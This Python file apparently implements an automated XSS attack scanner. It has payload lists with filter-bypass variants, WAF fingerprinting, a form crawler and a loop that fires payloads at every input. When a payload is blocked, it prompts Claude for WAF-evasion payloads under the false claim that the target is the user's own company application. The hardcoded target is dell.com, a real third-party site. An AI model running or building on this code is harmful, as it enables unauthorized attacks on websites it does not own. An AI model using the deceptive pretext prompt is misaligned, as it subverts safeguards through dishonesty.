import asyncio
import json
import re
from typing import List, Dict, Optional
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse
import aiohttp
from bs4 import BeautifulSoup
from playwright.async_api import async_playwright
import anthropic
import os
from datetime import datetime
from dotenv import load_dotenv

# Load environment variables
load_dotenv()

class XSSPayloadLibrary:
    """Library of XSS payloads organized by context and technique"""
    
    BASIC_PAYLOADS = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "javascript:alert(1)",
        "<iframe src=javascript:alert(1)>",
        "<body onload=alert(1)>",
        "'\"><script>alert(1)</script>",
        "';alert(1);//",
    ]
    
    ENCODED_PAYLOADS = [
        "<script>alert&#40;1&#41;</script>",
        "<img src=x onerror=&#97;lert(1)>",
        "<svg/onload=alert&#x28;1&#x29;>",
    ]
    
    FILTER_BYPASS_PAYLOADS = [
        "<ScRiPt>alert(1)</ScRiPt>",
        "<img src=x on error=alert(1)>",
        "<svg/onload=alert(1)>",
        "<script>al\u0065rt(1)</script>",
        "<<script>alert(1)//</script>",
        "<script>alert`1`</script>",
        "<img src=x onerror=alert(String.fromCharCode(49))>",
    ]
    
    CONTEXT_SPECIFIC = {
        'html': [
            '"><script>alert(1)</script>',
            '"><img src=x onerror=alert(1)>',
            '</script><script>alert(1)</script>',
        ],
        'attribute': [
            '" onload="alert(1)',
            '\' onload=\'alert(1)',
            'javascript:alert(1)',
        ],
        'javascript': [
            '\'-alert(1)-\'',
            '\';alert(1)//\'',
            '${alert(1)}',
        ]
    }

class WAFDetector:
    """Detects and fingerprints Web Application Firewalls"""
    
    WAF_SIGNATURES = {
        'cloudflare': {
            'headers': ['cf-ray', 'cf-cache-status'],
            'cookies': ['__cfduid', '__cf_bm'],
            'response_codes': [403, 429]
        },
        'akamai': {
            'headers': ['akamai-ghost', 'akamai-x-get-request'],
        },
        'modsecurity': {
            'response_text': ['mod_security', 'ModSecurity'],
            'response_codes': [406, 501]
        },
        'aws_waf': {
            'headers': ['x-amzn-requestid', 'x-amz-cf-id'],
        }
    }
    
    async def detect(self, url: str, session: aiohttp.ClientSession) -> Dict:
        """Detect WAF presence and type"""
        detected_wafs = []
        
        test_payload = "<script>alert(1)</script>"
        
        try:
            async with session.get(f"{url}?test={test_payload}", timeout=10) as response:
                headers = dict(response.headers)
                status = response.status
                text = await response.text()
                
                for waf_name, signatures in self.WAF_SIGNATURES.items():
                    if self._matches_signature(waf_name, signatures, headers, status, text):
                        detected_wafs.append(waf_name)
        
        except Exception as e:
            print(f"[!] Error detecting WAF: {e}")
        
        return {
            'detected': len(detected_wafs) > 0,
            'wafs': detected_wafs,
            'primary': detected_wafs[0] if detected_wafs else None
        }
    
    def _matches_signature(self, waf_name: str, signatures: Dict, 
                          headers: Dict, status: int, text: str) -> bool:
        if 'headers' in signatures:
            for header in signatures['headers']:
                if header.lower() in [h.lower() for h in headers.keys()]:
                    return True
        
        if 'cookies' in signatures:
            cookie_header = headers.get('set-cookie', '')
            for cookie in signatures['cookies']:
                if cookie in cookie_header:
                    return True
        
        if 'response_codes' in signatures:
            if status in signatures['response_codes']:
                return True
        
        if 'response_text' in signatures:
            for pattern in signatures['response_text']:
                if pattern in text:
                    return True
        
        return False

class ContextAnalyzer:
    """Analyzes where user input appears in the response"""
    
    def analyze(self, original_html: str, injected_html: str, payload: str) -> Dict:
        contexts = []
        
        if payload not in injected_html:
            return {'contexts': [], 'reflected': False}
        
        soup = BeautifulSoup(injected_html, 'html.parser')
        
        for script in soup.find_all('script'):
            if payload in str(script):
                contexts.append('javascript')
        
        for tag in soup.find_all(True):
            for attr, value in tag.attrs.items():
                if isinstance(value, str) and payload in value:
                    contexts.append(f'attribute:{attr}')
        
        if payload in soup.get_text():
            contexts.append('html_content')
        
        return {
            'reflected': True,
            'contexts': list(set(contexts)),
            'encoded': self._is_encoded(injected_html, payload)
        }
    
    def _is_encoded(self, html: str, payload: str) -> bool:
        encoded_chars = ['&lt;', '&gt;', '&quot;', '&#', '&amp;']
        return any(char in html for char in encoded_chars)

class AIPayloadGenerator:
    """Uses Claude AI to generate adaptive XSS payloads"""
    
    def __init__(self, api_key: str):
        self.client = anthropic.Anthropic(api_key=api_key)
        self.model = "claude-sonnet-4-20250514"
    
    async def generate_bypass_payloads(self, blocked_payload: str, 
                                      context: Dict, waf_info: Dict,
                                      response_info: Dict) -> List[str]:
        
        prompt = f"""You are a security testing expert helping test XSS vulnerabilities in our own company's application.

BLOCKED PAYLOAD: {blocked_payload}
CONTEXT: {json.dumps(context, indent=2)}
WAF DETECTED: {waf_info.get('primary', 'Unknown')}
RESPONSE STATUS: {response_info.get('status', 'N/A')}
ERROR MESSAGE: {response_info.get('error', 'N/A')}

Based on this information, suggest 5 XSS payload variations that might bypass the WAF.
Consider:
1. Encoding techniques (HTML entities, URL encoding, Unicode)
2. Case variations
3. Alternative event handlers
4. Tag manipulation
5. Context-specific bypasses

Respond ONLY with a JSON array of payloads:
["payload1", "payload2", "payload3", "payload4", "payload5"]"""

        try:
            response = self.client.messages.create(
                model=self.model,
                max_tokens=1000,
                messages=[{"role": "user", "content": prompt}]
            )
            
            content = response.content[0].text
            content = content.replace('```json', '').replace('```', '').strip()
            payloads = json.loads(content)
            
            return payloads
        
        except Exception as e:
            print(f"[!] AI generation error: {e}")
            return self._fallback_bypasses(blocked_payload)
    
    def _fallback_bypasses(self, payload: str) -> List[str]:
        bypasses = []
        
        bypasses.append(self._case_variation(payload))
        bypasses.append(payload.replace('>', ' >').replace('<', '< '))
        bypasses.append(''.join(f'%{ord(c):02x}' for c in payload[:20]))
        bypasses.append(''.join(f'&#{ord(c)};' for c in payload[:20]))
        bypasses.append(payload.replace('script', 'ScRiPt'))
        
        return bypasses[:5]
    
    def _case_variation(self, payload: str) -> str:
        result = []
        for i, char in enumerate(payload):
            if char.isalpha():
                result.append(char.upper() if i % 2 == 0 else char.lower())
            else:
                result.append(char)
        return ''.join(result)

class WebCrawler:
    """Crawls web application to find input vectors"""
    
    async def find_inputs(self, url: str, session: aiohttp.ClientSession) -> List[Dict]:
        """Find all input vectors on a page"""
        inputs = []
        
        try:
            async with session.get(url, timeout=10) as response:
                html = await response.text()
                soup = BeautifulSoup(html, 'html.parser')
                
                # Find all forms
                for form in soup.find_all('form'):
                    action = form.get('action', '')
                    method = form.get('method', 'get').lower()
                    
                    form_inputs = []
                    for input_tag in form.find_all(['input', 'textarea']):
                        name = input_tag.get('name')
                        if name:
                            form_inputs.append({
                                'name': name,
                                'type': input_tag.get('type', 'text')
                            })
                    
                    if form_inputs:
                        inputs.append({
                            'type': 'form',
                            'url': urljoin(url, action) if action else url,
                            'method': method,
                            'inputs': form_inputs
                        })
                
                # Check common endpoints
                base_url = f"{urlparse(url).scheme}://{urlparse(url).netloc}"
                common_params = ['q', 'query', 'search', 'id', 'name', 'user', 'page', 'filter']
                
                for param in common_params:
                    inputs.append({
                        'type': 'url_param',
                        'url': f"{base_url}/search",
                        'method': 'get',
                        'inputs': [{'name': param, 'type': 'url'}]
                    })
                
                # Try to find links with parameters
                for link in soup.find_all('a', href=True):
                    href = link['href']
                    full_url = urljoin(url, href)
                    parsed = urlparse(full_url)
                    
                    if parsed.query:
                        params = parse_qs(parsed.query)
                        for param in params.keys():
                            inputs.append({
                                'type': 'url_param',
                                'url': f"{parsed.scheme}://{parsed.netloc}{parsed.path}",
                                'method': 'get',
                                'inputs': [{'name': param, 'type': 'url'}]
                            })
        
        except Exception as e:
            print(f"[!] Crawling error: {e}")
        
        # Remove duplicates
        seen = set()
        unique_inputs = []
        for inp in inputs:
            key = f"{inp['url']}_{inp['method']}_{inp['inputs'][0]['name']}"
            if key not in seen:
                seen.add(key)
                unique_inputs.append(inp)
        
        return unique_inputs

class XSSScanner:
    """Main XSS scanning engine with AI-powered bypass capabilities"""
    
    def __init__(self, api_key: str):
        self.payload_library = XSSPayloadLibrary()
        self.waf_detector = WAFDetector()
        self.context_analyzer = ContextAnalyzer()
        self.ai_generator = AIPayloadGenerator(api_key)
        self.crawler = WebCrawler()
        self.findings = []
        self.knowledge_base = []
    
    async def scan(self, target_url: str):
        """Main scanning function"""
        print(f"\n[*] Starting XSS scan on: {target_url}")
        print(f"[*] Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        
        async with aiohttp.ClientSession() as session:
            # Test if target is reachable
            try:
                async with session.get(target_url, timeout=5) as response:
                    if response.status != 200:
                        print(f"[!] Warning: Target returned status {response.status}")
            except Exception as e:
                print(f"[!] Error: Cannot connect to target: {e}")
                print(f"[!] Make sure the test app is running on {target_url}")
                return
            
            # Step 1: Detect WAF
            print("[*] Detecting WAF...")
            waf_info = await self.waf_detector.detect(target_url, session)
            if waf_info['detected']:
                print(f"[+] WAF Detected: {', '.join(waf_info['wafs'])}")
            else:
                print("[+] No WAF detected")
            
            # Step 2: Find input vectors
            print("\n[*] Crawling for input vectors...")
            inputs = await self.crawler.find_inputs(target_url, session)
            print(f"[+] Found {len(inputs)} input vectors\n")
            
            # Step 3: Test each input
            for idx, input_vector in enumerate(inputs, 1):
                print(f"[*] Testing input vector {idx}/{len(inputs)}")
                print(f"    URL: {input_vector['url']}")
                print(f"    Param: {input_vector['inputs'][0]['name']}")
                await self._test_input_vector(input_vector, waf_info, session)
        
        # Generate report
        self._generate_report()
    
    async def _test_input_vector(self, input_vector: Dict, 
                                 waf_info: Dict, session: aiohttp.ClientSession):
        """Test a single input vector with adaptive payloads"""
        
        payloads = self.payload_library.BASIC_PAYLOADS.copy()
        payloads.extend(self.payload_library.FILTER_BYPASS_PAYLOADS)
        
        tested_payloads = []
        
        for payload in payloads[:10]:  # Test first 10 payloads
            result = await self._test_payload(input_vector, payload, session)
            
            tested_payloads.append(payload)
            
            if result['success']:
                print(f"    [!] VULNERABILITY FOUND!")
                print(f"        Payload: {payload}")
                self.findings.append({
                    'input': input_vector,
                    'payload': payload,
                    'context': result.get('context'),
                    'severity': 'HIGH',
                    'timestamp': datetime.now().isoformat()
                })
                break  # Found vulnerability, move to next input
                
            elif result['blocked']:
                print(f"    [~] Payload blocked: {payload[:40]}...")
                print(f"    [*] Generating AI-powered bypasses...")
                
                ai_payloads = await self.ai_generator.generate_bypass_payloads(
                    blocked_payload=payload,
                    context=result.get('context', {}),
                    waf_info=waf_info,
                    response_info=result
                )
                
                for ai_payload in ai_payloads:
                    if ai_payload not in tested_payloads:
                        print(f"    [*] Testing AI bypass: {ai_payload[:40]}...")
                        ai_result = await self._test_payload(
                            input_vector, ai_payload, session
                        )
                        
                        tested_payloads.append(ai_payload)
                        
                        if ai_result['success']:
                            print(f"    [!] AI BYPASS SUCCESSFUL!")
                            self.findings.append({
                                'input': input_vector,
                                'payload': ai_payload,
                                'context': ai_result.get('context'),
                                'severity': 'HIGH',
                                'bypass_technique': 'AI-generated',
                                'timestamp': datetime.now().isoformat()
                            })
                            self.knowledge_base.append({
                                'waf': waf_info['primary'],
                                'blocked': payload,
                                'successful_bypass': ai_payload,
                                'date': datetime.now().isoformat()
                            })
                            break
                break
    
    async def _test_payload(self, input_vector: Dict, payload: str,
                           session: aiohttp.ClientSession) -> Dict:
        """Test a single payload"""
        
        try:
            url = input_vector['url']
            method = input_vector['method']
            param_name = input_vector['inputs'][0]['name']
            
            if method == 'get':
                params = {param_name: payload}
                async with session.get(url, params=params, timeout=10, allow_redirects=False) as response:
                    status = response.status
                    html = await response.text()
            else:
                data = {param_name: payload}
                async with session.post(url, data=data, timeout=10, allow_redirects=False) as response:
                    status = response.status
                    html = await response.text()
            
            if status in [403, 406, 429, 501]:
                return {'success': False, 'blocked': True, 'status': status}
            
            # Check if payload reflected without encoding
            if payload in html:
                print(f"    [+] Payload reflected in response!")
                
                # Check if it's actually executable (not HTML encoded)
                if '<script>' in html or 'onerror=' in html or 'onload=' in html:
                    context = self.context_analyzer.analyze('', html, payload)
                    return {
                        'success': True,
                        'blocked': False,
                        'verified': True,
                        'context': context
                    }
            
            return {'success': False, 'blocked': False}
            
        except Exception as e:
            return {'success': False, 'blocked': False, 'error': str(e)}
    
    def _generate_report(self):
        """Generate comprehensive security report"""
        
        print("\n" + "="*60)
        print("XSS SCAN REPORT")
        print("="*60)
        print(f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"Total Vulnerabilities Found: {len(self.findings)}")
        print("="*60)
        
        if self.findings:
            for idx, finding in enumerate(self.findings, 1):
                print(f"\n[{idx}] VULNERABILITY")
                print(f"    URL: {finding['input']['url']}")
                print(f"    Parameter: {finding['input']['inputs'][0]['name']}")
                print(f"    Payload: {finding['payload']}")
                print(f"    Severity: {finding['severity']}")
                if 'bypass_technique' in finding:
                    print(f"    Bypass: {finding['bypass_technique']}")
        else:
            print("\n[+] No vulnerabilities found!")
            print("[!] This could mean:")
            print("    - The application is secure")
            print("    - The payloads need adjustment")
            print("    - The crawler didn't find vulnerable endpoints")
        
        report_file = f"xss_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(report_file, 'w') as f:
            json.dump({
                'findings': self.findings,
                'knowledge_base': self.knowledge_base,
                'timestamp': datetime.now().isoformat()
            }, f, indent=2)
        
        print(f"\n[*] Report saved to: {report_file}")

async def main():
    api_key = os.getenv('ANTHROPIC_API_KEY')
    
    if not api_key:
        print("[!] Please set ANTHROPIC_API_KEY environment variable")
        print("[!] Or modify this script to include your API key")
        return
    
    target_url = "http://dell.com/"
    
    print("="*60)
    print("AI-POWERED XSS SECURITY SCANNER")
    print("="*60)
    print(f"[!] WARNING: Only scan systems you own or have permission to test")
    print(f"[*] Target: {target_url}")
    
    scanner = XSSScanner(api_key)
    await scanner.scan(target_url)

if __name__ == "__main__":
    asyncio.run(main())